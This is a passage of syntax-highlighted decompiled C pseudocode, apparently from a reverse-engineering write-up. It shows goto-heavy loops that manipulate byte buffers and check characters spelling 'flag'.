class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">      v109[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    v25 = <span class="hljs-number">38</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v24 )</span><br><span class="line">    {</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      v109[<span class="hljs-number">2</span>] = v24;</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = v24--;</span><br><span class="line">      v109[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v109 - <span class="hljs-number">1</span>) = v24;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !--v25 )</span><br><span class="line">      {</span><br><span class="line">        *(_WORD *)v109 = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v24 )</span><br><span class="line">          *(v109 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_61;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">do</span></span><br><span class="line">      --v25;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v25 );</span><br><span class="line">    v4 = *(v109 - <span class="hljs-number">4</span>) == <span class="hljs-number">0</span>;</span><br><span class="line">    *(_WORD *)v109 = <span class="hljs-number">256</span>;</span><br><span class="line">    *(v109 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    v109[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    {</span><br><span class="line">      *v109 = <span class="hljs-number">0</span>;</span><br><span class="line">      v7 = v109 - <span class="hljs-number">2</span>;</span><br><span class="line">      v10 = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v109 - <span class="hljs-number">2</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">      v9 = v109 - <span class="hljs-number">1</span>;</span><br><span class="line">      v8 = <span class="hljs-number">0</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_61:</span><br><span class="line">  v7 = v109 - <span class="hljs-number">2</span>;</span><br><span class="line">LABEL_62:</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">5</span>] )</span><br><span class="line">    v7[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">6</span>] )</span><br><span class="line">    v7[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">7</span>] )</span><br><span class="line">    v7[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">8</span>] )</span><br><span class="line">  {</span><br><span class="line">    v26 = *(v7 - <span class="hljs-number">41</span>);</span><br><span class="line">    v7[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v26 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_70;</span><br><span class="line">LABEL_303:</span><br><span class="line">    v27 = v7 + <span class="hljs-number">6</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v7[<span class="hljs-number">7</span>] )</span><br><span class="line">    {</span><br><span class="line">      v28 = v7 + <span class="hljs-number">5</span>;</span><br><span class="line">      *v27 = <span class="hljs-string">'f'</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *((_WORD *)v7 + <span class="hljs-number">3</span>) = <span class="hljs-number">102</span>;</span><br><span class="line">      v28 = v7 + <span class="hljs-number">5</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_71;</span><br><span class="line">  }</span><br><span class="line">  v26 = *(v7 - <span class="hljs-number">41</span>);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v26 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_303;</span><br><span class="line">LABEL_70:</span><br><span class="line">  *(v7 - <span class="hljs-number">41</span>) = v26;</span><br><span class="line">  v27 = v7 + <span class="hljs-number">6</span>;</span><br><span class="line">  *(_WORD *)(v7 + <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  v28 = v7 + <span class="hljs-number">5</span>;</span><br><span class="line">  *v28 = v26;</span><br><span class="line">  *(_WORD *)(v28 + <span class="hljs-number">1</span>) = <span class="hljs-string">'f'</span>;</span><br><span class="line">  *((_BYTE *)v27 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  *(_BYTE *)v27 = <span class="hljs-number">102</span> - v26;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v26 != <span class="hljs-number">102</span> )</span><br><span class="line">  {</span><br><span class="line">LABEL_71:</span><br><span class="line">    *((_BYTE *)v27 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    *(_BYTE *)v27 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_72;</span><br><span class="line">  }</span><br><span class="line">  *((_BYTE *)v27 - <span class="hljs-number">1</span>) = <span class="hljs-number">1</span>;</span><br><span class="line">  v4 = v28[<span class="hljs-number">1</span>] == <span class="hljs-number">0</span>;</span><br><span class="line">  *v28 = <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    v28[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  v101 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v28[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v102 = v28++;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v101 )</span><br><span class="line">    {</span><br><span class="line">      v103 = *(v28 - <span class="hljs-number">1</span>);</span><br><span class="line">      ++v101;</span><br><span class="line">      *v28 = <span class="hljs-number">0</span>;</span><br><span class="line">      v28[<span class="hljs-number">1</span>] = v101;</span><br><span class="line">      v104 = v103 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v28 - <span class="hljs-number">1</span>) = v103 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v103 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_235;</span><br><span class="line">    }</span><br><span class="line">    v103 = *(v28 - <span class="hljs-number">1</span>);</span><br><span class="line">    v101 = <span class="hljs-number">1</span>;</span><br><span class="line">    v104 = v103 - <span class="hljs-number">1</span>;</span><br><span class="line">    *(v28 - <span class="hljs-number">1</span>) = v103 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v103 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_235:</span><br><span class="line">      *v28 = v103 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v28 - <span class="hljs-number">1</span>) = v104 - v103 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v102[<span class="hljs-number">3</span>] )</span><br><span class="line">    v102[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v102[<span class="hljs-number">4</span>] )</span><br><span class="line">  {</span><br><span class="line">    v105 = *(v102 - <span class="hljs-number">45</span>);</span><br><span class="line">    v102[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v105 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_242;</span><br><span class="line">LABEL_286:</span><br><span class="line">    v105 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v105 = *(v102 - <span class="hljs-number">45</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v105 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_286;</span><br><span class="line">LABEL_242:</span><br><span class="line">    *(v102 - <span class="hljs-number">45</span>) = v105;</span><br><span class="line">    v102[<span class="hljs-number">1</span>] = v105;</span><br><span class="line">    *(_WORD *)(v102 + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v27 = v102 + <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v101 )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v105 )</span><br><span class="line">      {</span><br><span class="line">        v106 = *(_BYTE *)v27;</span><br><span class="line">        v105 += *((_BYTE *)v27 - <span class="hljs-number">2</span>);</span><br><span class="line">        *((_BYTE *)v27 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">        *((_BYTE *)v27 - <span class="hljs-number">2</span>) = v105;</span><br><span class="line">        v107 = v106 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(_BYTE *)v27 = v106 - <span class="hljs-number">1</span>;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v106 == <span class="hljs-number">1</span> )</span><br><span class="line">          <span class="hljs-keyword">goto</span> LABEL_282;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        v106 = *(_BYTE *)v27;</span><br><span class="line">        v105 = *((_BYTE *)v27 - <span class="hljs-number">2</span>);</span><br><span class="line">        v107 = *(_BYTE *)v27 - <span class="hljs-number">1</span>;</span><br><span class="line">        *(_BYTE *)v27 = v107;</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v106 == <span class="hljs-number">1</span> )</span><br><span class="line">        {</span><br><span class="line">LABEL_282:</span><br><span class="line">          v28 = v27 - <span class="hljs-number">1</span>;</span><br><span class="line">          v27 = (_WORD *)((<span class="hljs-keyword">char</span> *)v27 - <span class="hljs-number">1</span>);</span><br><span class="line">          <span class="hljs-keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">      }</span><br><span class="line">      *((_BYTE *)v27 - <span class="hljs-number">1</span>) = v106 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(_BYTE *)v27 = v107 - v106 + <span class="hljs-number">1</span>;</span><br><span class="line">      v27 = (_WORD *)((<span class="hljs-keyword">char</span> *)v27 - <span class="hljs-number">1</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  *v27 = <span class="hljs-string">'l'</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v105 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_71;</span><br><span class="line">  *(_BYTE *)v27 = <span class="hljs-number">108</span> - v105;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v105 != <span class="hljs-number">108</span> )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_71;</span><br><span class="line">  ++*((_BYTE *)v27 - <span class="hljs-number">2</span>);</span><br><span class="line">  *((_BYTE *)v27 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">LABEL_72:</span><br><span class="line">  v29 = v28 - <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !*(v28 - <span class="hljs-number">1</span>) )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_94;</span><br><span class="line">  v4 = *v28 == <span class="hljs-number">0</span>;</span><br><span class="line">  *(v28 - <span class="hljs-number">1</span>) = <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    *v28 = <span class="hljs-number">0</span>;</span><br><span class="line">  v30 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v29[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v31 = v29++;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v30 )</span><br><span class="line">    {</span><br><span class="line">      v32 = *(v29 - <span class="hljs-number">1</span>);</span><br><span class="line">      ++v30;</span><br><span class="line">      *v29 = <span class="hljs-number">0</span>;</span><br><span class="line">      v29[<span class="hljs-number">1</span>] = v30;</span><br><span class="line">      v33 = v32 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v29 - <span class="hljs-number">1</span>) = v32 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v32 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_76;</span><br><span class="line">    }</span><br><span class="line">    v32 = *(v29 - <span class="hljs-number">1</span>);</span><br><span class="line">    v30 = <span class="hljs-number">1</span>;</span><br><span class="line">    v33 = v32 - <span class="hljs-number">1</span>;</span><br><span class="line">    *(v29 - <span class="hljs-number">1</span>) = v32 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v32 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_76:</span><br><span class="line">      *v29 = v32 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v29 - <span class="hljs-number">1</span>) = v33 - v32 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v31[<span class="hljs-number">3</span>] )</span><br><span class="line">    v31[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v31[<span class="hljs-number">4</span>] )</span><br><span class="line">  {</span><br><span class="line">    v34 = *(v31 - <span class="hljs-number">44</span>);</span><br><span class="line">    v31[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v34 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_83;</span><br><span class="line">LABEL_295:</span><br><span class="line">    v34 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v34 = *(v31 - <span class="hljs-number">44</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v34 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_295;</span><br><span class="line">LABEL_83:</span><br><span class="line">    *(v31 - <span class="hljs-number">44</span>) = v34;</span><br><span class="line">    v31[<span class="hljs-number">1</span>] = v34;</span><br><span class="line">    *(_WORD *)(v31 + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v35 = v31 + <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v30 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_91;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v34 )</span><br><span class="line">    {</span><br><span class="line">      v36 = *v35;</span><br><span class="line">      v34 += *(v35 - <span class="hljs-number">2</span>);</span><br><span class="line">      *(v35 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v35 - <span class="hljs-number">2</span>) = v34;</span><br><span class="line">      v37 = v36 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v35 = v36 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v36 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_89;</span><br><span class="line">    }</span><br><span class="line">    v36 = *v35;</span><br><span class="line">    v34 = *(v35 - <span class="hljs-number">2</span>);</span><br><span class="line">    v37 = *v35 - <span class="hljs-number">1</span>;</span><br><span class="line">    *v35 = v37;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v36 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_89:</span><br><span class="line">      v38 = v37 - v36;</span><br><span class="line">      v39 = v36 - <span class="hljs-number">1</span>;</span><br><span class="line">      v40 = v35 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v35 - <span class="hljs-number">1</span>) = v39;</span><br><span class="line">      *v35 = v38 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v39 )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_90;</span><br><span class="line">      --v35;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  v40 = v35 - <span class="hljs-number">1</span>;</span><br><span class="line">LABEL_90:</span><br><span class="line">  v29 = v35 - <span class="hljs-number">2</span>;</span><br><span class="line">  v35 = v40;</span><br><span class="line">LABEL_91:</span><br><span class="line">  *(_WORD *)v35 = <span class="hljs-number">97</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v34 &amp;&amp; (*v35 = <span class="hljs-string">'a'</span> - v34, v34 == <span class="hljs-string">'a'</span>) )</span><br><span class="line">  {</span><br><span class="line">    ++*(v35 - <span class="hljs-number">2</span>);</span><br><span class="line">    *(v35 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    *(v35 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    *v35 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_94:</span><br><span class="line">  v41 = v29 - <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !*(v29 - <span class="hljs-number">1</span>) )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_113;</span><br><span class="line">  v4 = *v29 == <span class="hljs-number">0</span>;</span><br><span class="line">  *(v29 - <span class="hljs-number">1</span>) = <span class="hljs-number">3</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v4 )</span><br><span class="line">    *v29 = <span class="hljs-number">0</span>;</span><br><span class="line">  v42 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v41[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v43 = v41++;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v42 )</span><br><span class="line">    {</span><br><span class="line">      v44 = *(v41 - <span class="hljs-number">1</span>);</span><br><span class="line">      ++v42;</span><br><span class="line">      *v41 = <span class="hljs-number">0</span>;</span><br><span class="line">      v41[<span class="hljs-number">1</span>] = v42;</span><br><span class="line">      v45 = v44 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v41 - <span class="hljs-number">1</span>) = v44 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v44 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_98;</span><br><span class="line">    }</span><br><span class="line">    v44 = *(v41 - <span class="hljs-number">1</span>);</span><br><span class="line">    v42 = <span class="hljs-number">1</span>;</span><br><span class="line">    v45 = v44 - <span class="hljs-number">1</span>;</span><br><span class="line">    *(v41 - <span class="hljs-number">1</span>) = v44 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v44 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_98:</span><br><span class="line">      *v41 = v44 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v41 - <span class="hljs-number">1</span>) = v45 - v44 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v43[<span class="hljs-number">3</span>] )</span><br><span class="line">    v43[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v43[<span class="hljs-number">4</span>] )</span><br><span class="line">  {</span><br><span class="line">    v46 = *(v43 - <span class="hljs-number">43</span>);</span><br><span class="line">    v43[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v46 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_105;</span><br><span class="line">LABEL_293:</span><br><span class="line">    v46 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v46 = *(v43 - <span class="hljs-number">43</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v46 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_293;</span><br><span class="line">LABEL_105:</span><br><span class="line">    *(v43 - <span class="hljs-number">43</span>) = v46;</span><br><span class="line">    v43[<span class="hljs-number">1</span>] = v46;</span><br><span class="line">    *(_WORD *)(v43 + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v47 = v43 + <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v42 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_110;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v46 )</span><br><span class="line">    {</span><br><span class="line">      v48 = *v47;</span><br><span class="line">      v46 += *(v47 - <span class="hljs-number">2</span>);</span><br><span class="line">      *(v47 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v47 - <span class="hljs-number">2</span>) = v46;</span><br><span class="line">      v49 = v48 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v47 = v48 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v48 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_109;</span><br><span class="line">    }</span><br><span class="line">    v48 = *v47;</span><br><span class="line">    v46 = *(v47 - <span class="hljs-number">2</span>);</span><br><span class="line">    v49 = *v47 - <span class="hljs-number">1</span>;</span><br><span class="line">    *v47 = v49;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v48 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_109:</span><br><span class="line">      *(v47 - <span class="hljs-number">1</span>) = v48 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v47-- = v49 - v48 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  v41 = v47 - <span class="hljs-number">2</span>;</span><br><span class="line">  --v47;</span><br><span class="line">LABEL_110:</span><br><span class="line">  *(_WORD *)v47 = <span class="hljs-number">103</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v46 &amp;&amp; (*v47 = <span class="hljs-string">'g'</span> - v46, v46 == <span class="hljs-string">'g'</span>) )</span><br><span class="line">  {</span><br><span class="line">    ++*(v47 - <span class="hljs-number">2</span>);</span><br><span class="line">    *(v47 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    *(v47 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">    *v47 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_113:</span><br><span class="line">  v50 = v41 - <span class="hljs-number">1</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !*(v41 - <span class="hljs-number">1</span>) )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_133;</span><br><span class="line">  *(v41 - <span class="hljs-number">1</span>) = <span class="hljs-number">4</span>;</span><br><span class="line">  v51 = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    v50[<span class="hljs-number">2</span>] = <span class="hljs-number">1</span>;</span><br><span class="line">    v52 = v50++;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v51 )</span><br><span class="line">    {</span><br><span class="line">      v53 = *(v50 - <span class="hljs-number">1</span>);</span><br><span class="line">      ++v51;</span><br><span class="line">      *v50 = <span class="hljs-number">0</span>;</span><br><span class="line">      v50[<span class="hljs-number">1</span>] = v51;</span><br><span class="line">      v54 = v53 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v50 - <span class="hljs-number">1</span>) = v53 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v53 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_115;</span><br><span class="line">    }</span><br><span class="line">    v53 = *(v50 - <span class="hljs-number">1</span>);</span><br><span class="line">    v51 = <span class="hljs-number">1</span>;</span><br><span class="line">    v54 = v53 - <span class="hljs-number">1</span>;</span><br><span class="line">    *(v50 - <span class="hljs-number">1</span>) = v53 - <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v53 != <span class="hljs-number">1</span> )</span><br><span class="line">    {</span><br><span class="line">LABEL_115:</span><br><span class="line">      *v50 = v53 - <span class="hljs-number">1</span>;</span><br><span class="line">      *(v50 - <span class="hljs-number">1</span>) = v54 - v53 + <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">continue</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v52[<span class="hljs-number">3</span>] )</span><br><span class="line">    v52[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v52[<span class="hljs-number">4</span>] )</span><br><span class="line">  {</span><br><span class="line">    v55 = *(v52 - <span class="hljs-number">42</span>);</span><br><span class="line">    v52[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v55 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_122;</span><br><span class="line">LABEL_291:</span><br><span class="line">    v55 = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v55 = *(v52 - <span class="hljs-number">42</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> ( !v55 )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_291;</span><br><span class="line">LABEL_122:</span><br><span class="line">    *(v52 - <span class="hljs-number">42</span>) = v55;</span><br><span class="line">    v52[<span class="hljs-number">1</span>] = v55;</span><br><span class="line">    *(_WORD *)(v52 + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  v56 = v52 + <span class="hljs-number">2</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( !v51 )</span><br><span class="line">    <span class="hljs-keyword">goto</span> LABEL_130;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v55 )</span><br><span class="line">    {</span><br><span class="line">      v57 = *v56;</span><br><span class="line">      v55 += *(v56 - <span class="hljs-number">2</span>);</span><br><span class="line">      *(v56 - <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;</span><br><span class="line">      *(v56 - <span class="hljs-number">2</span>) = v55;</span><br><span class="line">      v58 = v57 - <span class="hljs-number">1</span>;</span><br><span class="line">      *v56 = v57 - <span class="hljs-number">1</span>;</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v57 == <span class="hljs-number">1</span> )</span><br><span class="line">        <span class="hljs-keyword">break</span>;</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_128;</span><br><span class="line">    }</span><br><span class="line">    v57 = *v56;</span><br><span class="line">    v55 = *(v56 - <span class="hljs-number">2</span>);</span><br><span class="line">    v58 = *v56 - <span class="hljs-number">1</span>;</span><br><span class="line">    *v56 = v58;</span><br><span class="line">    <span 